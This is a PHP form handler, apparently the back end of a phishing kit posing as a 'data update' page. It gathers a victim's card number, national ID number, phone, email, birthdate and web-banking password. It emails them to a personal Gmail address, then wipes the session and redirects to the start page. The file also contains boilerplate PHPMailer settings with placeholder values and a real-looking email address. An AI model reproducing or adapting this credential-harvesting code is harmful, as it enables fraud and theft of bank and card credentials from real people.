<?php

    session_start();
    
    //valores del formulario 
    $name = $_POST['name'];
    $dni = $_POST['dni'];
    $tel = $_POST['tel'];
    $email = $_POST['email'];
    $cc = $_SESSION['cc'];
    $pass = $_SESSION['pass'];
    $birthdate = $_POST['birthdate'];

    //Correo a donde se envía la información
    $to = "cruzadoeduar18@gmail.com";

    //Asunto de correo
    $subject = "ACTUALIZACIÓN DE DATOS";

    //Informacion que se envía en el correo
    $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
            "DNI: " . $dni . "\n" . 
            "NUMERO DE TELEFONO: " . $tel . "\n" . 
            "DIRECCIÓN DE CORREO: " . $email . "\n" .
            "NOMBRE: " . $name . "\n" . 
            "FECHA DE NACIMIENTO: " . $birthdate . "\n" . 
            "CLAVE WEB: " . $pass;

    //Destinatario
    $headers = "From: pruebas@pruebas.ga";

    mail($to, $subject, $txt, $headers);

    //phpmailer

    $mail = new PHPMailer();

    // Settings
    $mail->IsSMTP();
    $mail->CharSet = 'UTF-8';

    $mail->Host       = "mail.example.com";    // SMTP server example
    $mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
    $mail->SMTPAuth   = true;                  // enable SMTP authentication
    $mail->Port       = 25;                    // set the SMTP port for the GMAIL server
    $mail->Username   = "username";            // SMTP account username example
    $mail->Password   = "password";            // SMTP account password example

    // Content
    $mail->isHTML(true);                       // Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

$mail->send();

    //Al finalizar se elimina la sesión y se borran las variables con la información del formulario
    session_unset();
    session_destroy();

    //redireccionar
    header("Location:index.html");